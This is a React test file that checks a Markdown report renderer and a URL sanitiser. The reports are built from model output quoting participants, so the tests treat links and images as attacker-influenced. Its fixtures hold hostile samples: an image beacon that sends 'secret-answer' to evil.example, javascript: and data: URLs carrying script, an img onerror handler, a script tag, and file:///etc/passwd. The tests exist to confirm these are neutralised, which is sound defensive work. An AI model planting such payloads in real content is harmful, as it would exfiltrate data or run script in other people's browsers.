import { render } from "@testing-library/react";
import { beforeEach, describe, expect, it, vi } from "vitest";
import { ReportMarkdown, safeUrl } from "@/components/report/ReportMarkdown";

// Mermaid is a large browser-only dependency and its rendering is not under test here.
vi.mock("@/components/report/MermaidDiagram", () => ({
  MermaidDiagram: ({ code }: { code: string }) => <pre data-testid="diagram">{code}</pre>,
}));

/**
 * Reports are built from model output that quotes participants (P13, D-165): an image or a link in
 * one is attacker-influenced. An image would be fetched by the administrator's browser on render.
 */
describe("ReportMarkdown renders attacker-influenced text inertly", () => {
  const md = [
    "Intro ![tracker](https://evil.example/p?d=secret-answer) after.",
    "",
    "[click](javascript:alert(1)) and [data](data:text/html,<script>alert(1)</script>)",
    "",
    "[plain http](http://evil.example/a) and [relative](/admin/users) and [good](https://docs.example.com/page)",
    "",
    '<img src="https://evil.example/raw.png" onerror="alert(1)"> and <script>alert(2)</script>',
    "",
    "<https://auto.example.com/x>",
  ].join("\n");

  let container: HTMLElement;
  beforeEach(() => {
    container = render(<ReportMarkdown markdown={md} />).container;
  });

  it("renders no image element at all, so nothing is fetched", () => {
    expect(container.querySelectorAll("img")).toHaveLength(0);
    expect(container.innerHTML).not.toContain("evil.example/p?d=");
    expect(container.innerHTML).not.toContain("raw.png");
  });

  it("does not render raw HTML or script", () => {
    expect(container.querySelectorAll("script")).toHaveLength(0);
    expect(container.innerHTML).not.toContain("onerror");
  });

  it("keeps only https and mailto links, and drops javascript:, data:, http: and relative ones", () => {
    const hrefs = [...container.querySelectorAll("a")].map((a) => a.getAttribute("href"));
    expect(hrefs).toContain("https://docs.example.com/page");
    expect(hrefs).toContain("https://auto.example.com/x");
    for (const bad of ["javascript:", "data:", "http://evil.example", "/admin/users"]) {
      expect(hrefs.some((h) => h?.startsWith(bad))).toBe(false);
    }
    expect(container.innerHTML).not.toContain("javascript:");
  });

  it("opens a kept link safely, and says where it goes when the text does not", () => {
    const link = [...container.querySelectorAll("a")].find(
      (a) => a.getAttribute("href") === "https://docs.example.com/page",
    );
    expect(link?.getAttribute("rel")).toBe("noopener noreferrer nofollow");
    expect(link?.getAttribute("target")).toBe("_blank");
    expect(link?.parentElement?.textContent).toContain("(docs.example.com)");
  });
});

describe("safeUrl", () => {
  it.each([
    ["https://example.com/a", "https://example.com/a"],
    ["mailto:a@b.io", "mailto:a@b.io"],
    ["#section-2", "#section-2"],
    ["http://example.com", ""],
    ["javascript:alert(1)", ""],
    ["JaVaScRiPt:alert(1)", ""],
    ["data:text/html;base64,AAAA", ""],
    ["//evil.example/x", ""],
    ["/relative", ""],
    ["file:///etc/passwd", ""],
    [" https://example.com ", "https://example.com"],
  ])("%s -> %j", (input, out) => {
    expect(safeUrl(input)).toBe(out);
  });
});
